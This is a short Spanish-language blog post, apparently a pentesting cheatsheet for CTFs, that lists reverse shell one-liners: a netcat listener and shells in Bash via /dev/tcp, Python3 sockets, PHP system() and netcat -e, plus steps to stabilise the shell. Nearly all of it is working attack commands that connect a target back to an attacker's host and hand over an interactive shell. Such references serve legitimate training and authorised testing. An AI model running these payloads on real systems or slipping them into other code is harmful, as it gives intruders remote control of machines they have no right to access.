---
layout: post
title: "Cheatsheet: Reverse Shells"
read_time: ""
date: 2026-04-15
tags: [reverseshell, bash, python, netcat, privesc]
description: "Colección de reverse shells en distintos lenguajes para CTFs y pentesting."
---

Referencia rápida de reverse shells. Cambia `LHOST` y `LPORT` según tu entorno.

## Listener en Kali

```bash
nc -lvnp 4444
```

## Bash

```bash
bash -i >& /dev/tcp/LHOST/LPORT 0>&1
```

## Python3

```python
python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("LHOST",LPORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/bash"])'
```

## PHP

```php
<?php system("bash -c 'bash -i >& /dev/tcp/LHOST/LPORT 0>&1'"); ?>
```

## Netcat (con -e)

```bash
nc LHOST LPORT -e /bin/bash
```

## Estabilizar la shell

```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
# Ctrl+Z
stty raw -echo; fg
export TERM=xterm
```

## Recursos

- [revshells.com](https://www.revshells.com)
